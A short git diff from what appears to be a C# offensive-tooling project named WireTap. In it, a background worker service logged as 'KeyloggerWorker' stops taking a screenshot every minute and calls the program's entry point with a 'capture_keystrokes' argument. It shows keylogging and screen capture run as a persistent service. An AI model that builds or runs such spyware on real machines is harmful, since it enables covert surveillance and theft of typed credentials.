@@ -15,18 +15,22 @@ namespace WireTap.WorkerService
             _logger = logger;
         }
 
+        public static string[] Arguments = new[] { "capture_keystrokes" };
+
         protected override async Task ExecuteAsync(CancellationToken stoppingToken)
         {
             _logger.LogInformation("KeyloggerWorker running at: {time}", DateTimeOffset.Now);
 
-            while (!stoppingToken.IsCancellationRequested)
-            {
-                var tempFile = Helpers.CreateTempFileName(".jpeg", "screenshot-");
-                Display.CaptureImage(tempFile);
-                Console.WriteLine("[+] Screenshot captured at: {0}", tempFile);
+            await WireTap.Program.Main(Arguments);
 
-                await Task.Delay(TimeSpan.FromMinutes(1));
-            }
+            //while (!stoppingToken.IsCancellationRequested)
+            //{
+            //    var tempFile = Helpers.CreateTempFileName(".jpeg", "screenshot-");
+            //    Display.CaptureImage(tempFile);
+            //    Console.WriteLine("[+] Screenshot captured at: {0}", tempFile);
+
+            //    await Task.Delay(TimeSpan.FromMinutes(1));
+            //}
         }
     }
 }
